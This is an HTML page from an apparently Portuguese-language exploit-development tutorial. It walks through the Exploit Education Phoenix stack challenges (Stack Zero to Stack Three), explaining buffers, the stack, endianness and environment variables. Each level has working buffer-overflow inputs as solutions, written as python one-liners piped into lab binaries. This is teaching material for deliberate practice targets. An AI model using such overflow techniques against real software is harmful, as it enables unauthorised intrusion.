<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./aventura.html"><strong>1.</strong> Aventura</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>3.</strong> Mitiga√ß√µes</a></li><li><strong>4.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Pratica</li><li><ul class="section"><li><strong>5.1.1.</strong> Protostar Stack Six</li></ul></li><li><strong>5.2.</strong> M√∫ltiplos est√°gios</li><li><strong>5.3.</strong> Avan√ßado: M√∫ltiplos ret2libc</li></ul></li><li><strong>6.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>6.1.</strong> Brainpan</li><li><strong>6.2.</strong> Tib3rius BOF Prep</li></ul></li><li><strong>7.</strong> ROP</li><li><ul class="section"><li><strong>7.1.</strong> Primitivos</li><li><ul class="section"><li><strong>7.1.1.</strong> ROPE</li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><strong>7.2.1.</strong> ROPE: pivot</li></ul></li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Phoenix: Format</li><li class="spacer"></li><li><strong>11.</strong> Teoria</li><li><strong>12.</strong> B√°sico</li><li><ul class="section"><li><strong>12.1.</strong> Fastbins Dup</li><li><strong>12.2.</strong> House of Force</li><li><strong>12.3.</strong> Unsafe Unlink</li><li><strong>12.4.</strong> Safe Unlink</li><li><strong>12.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>12.6.</strong> Frame Faking</li></ul></li><li><strong>13.</strong> Intermedi√°rio</li><li><ul class="section"><li><strong>13.1.</strong> House of Orange</li><li><ul class="section"><li><strong>13.1.1.</strong> Heap Extension</li><li><strong>13.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>13.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>13.2.</strong> House of Spirit</li></ul></li><li><strong>14.</strong> Avan√ßado</li><li><ul class="section"><li><strong>14.1.</strong> House of Rust</li></ul></li><li><strong>15.</strong> Shellphish: How2Heap</li><li class="spacer"></li><li><strong>16.</strong> Intro AFL</li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <a class="header" href="print.html#aventura" id="aventura"><h1>Aventura</h1></a>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<pre><code>  Stack Intro: Phoenix
        |
     ___|__________ ________  
    |              |        |
    V              V        V
  Format       O resto     Fuzzing__________________________ ___ 
  Strings      da Stack      |                              |   |
                   |         |_________ _______ _____       V   |
               ____|__       |         |       |     |    AFL+  |
              |       |      V         V       V     |    ASAN  V
              V       V    Gen√©tico   Taint    Sym   |         Peach
           Windows   Heap            Analise   Exec  |
            |        Intro                           |
    ________|      ____V________________             |
   |        |     |    |                |            |
   V        |     |    |                |            |
   Win      V     |    V                V            |
 File Sys  Win    |    Heap           Linux          |
           Stack  | Intermedi√°rio     Kernel         |
            |     |     |                |___________|
            |__ __|     |                            |
               |        |                            V
               V        V                           Kernel
              Win      Heap                         Fuzzing  
              Heap    Avan√ßado
</code></pre>
<p>Opa, tudo bom?</p>
<p>Tutorialzinho pq n√£o achei nenhum em portugu√™s D:</p>
<p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong></p>
<p>Eu ainda n√£o postei tudo, mas quando tiver tempo eu posto :D</p>
<p>Se quiser um bom em ingles:</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas √© sobre o antigo: Protostar)</a></p>
<p>Status</p>
<ul>
<li>[X] Stack</li>
<li>[ ] Format</li>
<li>[ ] Heap</li>
<li>[ ] Net</li>
<li>[ ] Final</li>
</ul>
<a class="header" href="print.html#-prerequisitos" id="-prerequisitos"><h1>üñ•Ô∏è Prerequisitos:</h1></a>
<ul>
<li>Saber alguma linguagem de programa√ß√£o e conceitos relacionados</li>
</ul>
<a class="header" href="print.html#-opcional-mas-util-saber" id="-opcional-mas-util-saber"><h1>üêß Opcional mas util saber</h1></a>
<ul>
<li>üíæ Um pouco de C / C++ / Rust / Linguagem de n√≠vel baixo</li>
<li>üêç Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>üêß Saber o b√°sico de Linux</li>
</ul>
<a class="header" href="print.html#-setup" id="-setup"><h1>ü§ñ Setup:</h1></a>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>N√ÇO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usu√°rios/senha s√£o: user/user e root/root</li>
<li>Os arquivos t√£o em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<a class="header" href="print.html#-descri√ß√£o" id="-descri√ß√£o"><h1>üìù Descri√ß√£o</h1></a>
<p>Esse n√≠vel demonstra que memoria pode ser acessada fora da sua regi√£o
inicialmente alocada, como as vari√°veis s√£o alocadas na stack, e que altera-las pode mudar a execu√ß√£o do programa.</p>
<p>Objetivo: Alterar a vari√°vel &quot;changeme&quot;</p>
<a class="header" href="print.html#-dica" id="-dica"><h1>üí° Dica</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<a class="header" href="print.html#conhecimento-preliminar" id="conhecimento-preliminar"><h1>Conhecimento Preliminar</h1></a>
<a class="header" href="print.html#buffer" id="buffer"><h2>Buffer</h2></a>
<p>Buffers s√£o similares a arrays em outras linguagens de programa√ß√£o,
mas possuem tamanho fixo!</p>
<p>Eles s√£o definidos usando: <code>tipo nome[tamanho]</code></p>
<p>O <code>tipo</code>, √© do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possu√≠rem tamanho fixo, s√£o armazenados na stack!</p>
<a class="header" href="print.html#stack" id="stack"><h2>Stack</h2></a>
<p>A stack √© uma por√ß√£o da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando voc√™ quer colocar um novo, voc√™ coloca no topo da pilha (push)
Quando voc√™ quer pegar um da pilha, voc√™ pega o do topo (pop)

O ultimo a entrar, √© o primeiro a sair...
o nome desse comportamento √© LIFO (Last in First Out)
</code></pre>
<p><img src="./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<a class="header" href="print.html#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores"><h3>A stack cresce para valores menores</h3></a>
<pre><code>Imagina que ela √© um po√ßo que come√ßa na profundidade 15

Quando voc√™ coloca um objeto de tamanho 2 no po√ßo:
ele vai estar apoiado na profundidade 15, e vai at√© a profundidade 13

Em seguida, voc√™ coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai at√© a profundidade 10
</code></pre>
<p>Conforme voc√™ vai <strong>adicionando</strong> itens, o endere√ßo que eles est√£o vai <strong>diminuindo</strong> em valor.
√â meio confuso, mas com o tempo voc√™ pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endere√ßos t√£o em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; √© pra representar que o valor t√° em hex).</p>
<a class="header" href="print.html#hex" id="hex"><h3>Hex</h3></a>
<p>Se vc n√£o souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numera√ß√£o hexadecimal</a>
. Mas resumindo, em hex voc√™ conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Ent√£o a base da stack √© 0xFFFFFFFF e o topo 0X00000000 !</p>
<a class="header" href="print.html#melhorando-o-exemplo-do-po√ßo" id="melhorando-o-exemplo-do-po√ßo"><h3>Melhorando o exemplo do po√ßo</h3></a>
<pre><code>0x0- 	     Topo da stack/Topo do po√ßo
0xA ate 0x1- espa√ßo vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do po√ßo, primeiro item
</code></pre>
<a class="header" href="print.html#-explica√ß√£o" id="-explica√ß√£o"><h1>üéâ Explica√ß√£o</h1></a>
<p>A fun√ß√£o main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>ü•û Alocando as vari√°veis na stack (buffer[64], changeme)</li>
<li>üí• Alterar buffer[64] usando gets()</li>
<li>‚úÖ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
            // Definir vari√°veis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo n√≠vel faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela n√£o deveria estar mudando!</p>
<p>Calma que voc√™ ja vai entender :)</p>
<a class="header" href="print.html#-1--alocando-as-vari√°veis-na-stack-buffer64-changeme" id="-1--alocando-as-vari√°veis-na-stack-buffer64-changeme"><h2>ü•û 1- Alocando as vari√°veis na stack (buffer[64], changeme)</h2></a>
<p>A vari√°vel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A vari√°vel <code>changeme</code> esta marcada como <code>vol√°til</code> para prevenir que o compilador
destrua ela (pq originalmente n√£o seria
alterada, ent√£o seria destru√≠da para otimizar o c√≥digo...
Mas n√≥s vamos alterar ela por m√©todos... ~risada mal√©fica~ ... n√£o convencionais hehehe).</p>
<p>Nossas duas vari√°veis (buffer[64] e changeme) s√£o empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<a class="header" href="print.html#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets"><h2>üí• 2- Alterar buffer[64] usando gets</h2></a>
<p>A fun√ß√£o <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema √© que ela <strong>n√£o</strong> checa se o valor recebido √© maior que o <code>buffer</code>, permitindo que
voc√™ <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai come√ßar a escrever no topo do buffer (menor endere√ßo)
e vai descendo at√© a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Ent√£o, caso coloc√°ssemos 100 &quot;A&quot;s no buffer de tamanho 64, as vari√°veis nos pr√≥ximos 36 endere√ßos seriam alteradas.</p>
<p>Essas vari√°veis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; √© 0x41, voc√™ pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usu√°rio pode escrever fora memoria dele? perigoso ne! D:</p>
<p>√â por isso que essa fun√ß√£o est√° marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a vari√°vel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<a class="header" href="print.html#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada"><h2>‚úÖ 3- O programa checa se changeme foi alterada</h2></a>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, √© vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na pr√°tica?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Ent√£o se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
</code></pre>
<a class="header" href="print.html#-64-as-changeme-n√£o-alterado" id="-64-as-changeme-n√£o-alterado"><h3>‚ùå 64 As, changeme n√£o alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<a class="header" href="print.html#-65-as-changeme-alterado" id="-65-as-changeme-alterado"><h3>‚úÖ 65 As, changeme alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<a class="header" href="print.html#üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab"><h3>üÖ±Ô∏è 64 As e um B (0x42): AAAAAAAAA.....AAAB</h3></a>
<p>Para demonstrar melhor esse comportamento do buffer
ser escrito em um sentido espec√≠fico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code></p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na vari√°vel!! Uhhuuu :D</p>
<p>Esses As s√≥ pra encher a stack s√£o chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explica√ß√£o, mas relaxa que daqui pra frente fica mais dif√≠cil hehehe :D</p>
<p>Se voc√™ chegou at√© aqui, voc√™ ta de parab√©ns !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas vari√°veis e no buffer, mostra o sentido que o
buffer escreve, e ele vazando e mudando o valor das outras vari√°veis...</p>
<a class="header" href="print.html#-solu√ß√£o" id="-solu√ß√£o"><h1>üëæ Solu√ß√£o</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<a class="header" href="print.html#-objetivo" id="-objetivo"><h1>üéØ Objetivo</h1></a>
<p>Agora o objetivo n√£o √© s√≥ alterar <code>changeme</code>, √© alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois √©, ele vai ser super util agora!</p>
<a class="header" href="print.html#-dicas" id="-dicas"><h1>üí° Dicas</h1></a>
<p>Ver a representa√ß√£o hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<a class="header" href="print.html#-explica√ß√£o-1" id="-explica√ß√£o-1"><h1>üí´ Explica√ß√£o</h1></a>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por tr√°s das cenas √© que as letras est√£o virando a sua representa√ß√£o hex.</p>
<p>Ent√£o <code>print(&quot;A&quot;*5)</code> √© equivalente √† <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta aten√ß√£o no b&quot;&quot; : esse b indica que s√£o Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de voc√™ usar valores arbitr√°rios pra esses bytes,
ent√£o voc√™ pode usar o python2 (o print n√£o tem par√™nteses, mas o resto √© igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
                to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, ent√£o podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<a class="header" href="print.html#input" id="input"><h2>Input</h2></a>
<p>Nesse caso, o programa n√£o ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
voc√™ executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>argv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc √© a contagem: quantas coisas tem no argv! E aqui t√° checando se √© menor que 2!</p>
</blockquote>
<p>ent√£o no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos par√™nteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>ent√£o <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<a class="header" href="print.html#endian" id="endian"><h2>Endian</h2></a>
<p>O valor de changeme tem tamanho 4 bytes, pq ele √© um integer (integers s√£o 32 ou 64 bits, ent√£o 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os n√∫meros s√£o representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos d√≠gitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros s√£o representados em ordem decrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros s√£o representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte tr√™s:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, ent√£o eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Ent√£o pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu n√£o sei que letras s√£o equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<a class="header" href="print.html#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente"><h3>üåô Dica: Usando valores hex diretamente</h3></a>
<p>Lembra que eu falei que letras s√£o valores hex? A gente tamb√©m pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Ent√£o usar b&quot;\x41&quot; √© igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria!</p>
<p>Caso voc√™ queira usar as letras, voce pode tamb√©m!</p>
<p>Ent√£o <code>b'\x62\x59\x6c\x49'</code> √© equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte n√£o tem um correspondente v√°lido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, √© mais pr√°tico usar <code>\x</code> 99% das vezes, ent√£o vale a pena criar o habito!</p>
<a class="header" href="print.html#-solu√ß√£o-1" id="-solu√ß√£o-1"><h1>üî• Solu√ß√£o</h1></a>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<a class="header" href="print.html#-objetivo-1" id="-objetivo-1"><h1>üéØ Objetivo</h1></a>
<p>Similar √† anterior, a gente precisa mudar o valor da vari√°vel changeme,
mas dessa vez ao inv√©s de usar o input ou argv, vamos usar env!</p>
<a class="header" href="print.html#-explica√ß√£o-2" id="-explica√ß√£o-2"><h1>üí´ Explica√ß√£o</h1></a>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
environment variable.</p>
<a class="header" href="print.html#-environment-variable-vari√°vel-do-ambiente" id="-environment-variable-vari√°vel-do-ambiente"><h2>üå≥ Environment Variable (Vari√°vel do ambiente)</h2></a>
<p>Essas vari√°veis s√£o acess√≠veis para todos os programas
executando naquela se√ß√£o. E normalmente contem prefer√™ncias como cores, o tipo de terminal, etcetc....</p>
<p>Voc√™ pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Voc√™ pode definir uma at√© o resto da se√ß√£o</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Voc√™ pode definir uma somente para execu√ß√£o daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para n√≥s, n√£o faz tanta diferen√ßa se o input √© pelas <code>envs</code> ou por outro m√©todo.</p>
<p>O √∫nico problema √© que n√£o podemos usar o Null Byte (0x00), pois ele √© usado para indicar o final de uma string ASCII, portanto terminando nossa vari√°vel precocemente.</p>
<a class="header" href="print.html#overflow" id="overflow"><h2>Overflow</h2></a>
<p>Em seguida, o valor √© copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A fun√ß√£o <code>strcpy</code>, assim como <code>gets</code>, n√£o checa se o valor √© maior que o buffer, tornando o programa vulner√°vel... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em considera√ß√£o que o sistema √© LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres s√£o usados para encerrar linha, n√£o √© uma letra do teclado! D:</p>
<p>Pois √©, ent√£o vamos precisar usar os bytes diretamente.</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais f√°cil :D</p>
<a class="header" href="print.html#-solu√ß√£o-2" id="-solu√ß√£o-2"><h1>üî• Solu√ß√£o</h1></a>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<a class="header" href="print.html#-objetivo-2" id="-objetivo-2"><h1>üéØ Objetivo</h1></a>
<p>Usar um pointer para retornar para uma fun√ß√£o pre existente</p>
<a class="header" href="print.html#-dica-1" id="-dica-1"><h1>üí° Dica</h1></a>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<a class="header" href="print.html#-explica√ß√£o-3" id="-explica√ß√£o-3"><h1>üí´ Explica√ß√£o</h1></a>
<ul>
<li>O que raios s√£o pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<a class="header" href="print.html#-o-que-raios-s√£o-pointers" id="-o-que-raios-s√£o-pointers"><h3>‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers</h3></a>
<blockquote>
<p>Pointers s√£o uma estrutura que, ao inv√©s de armazenar dados, armazena o endere√ßo de outra estrutura.
Lembra do exemplo do po√ßo? Que cada item tinha seu endere√ßo na stack! Ent√£o, um pointer armazena esse endere√ßo! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade est√° em Y dire√ß√£o.</p>
<p>Colunas: Nome da Vari√°vel | Endere√ßo | conte√∫do</p>
<p><img src="./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A vari√°vel &quot;a&quot; √© um pointer que armazena a localiza√ß√£o da vari√°vel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; est√° apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia √° &quot;b&quot; !</p>
</blockquote>
<blockquote>
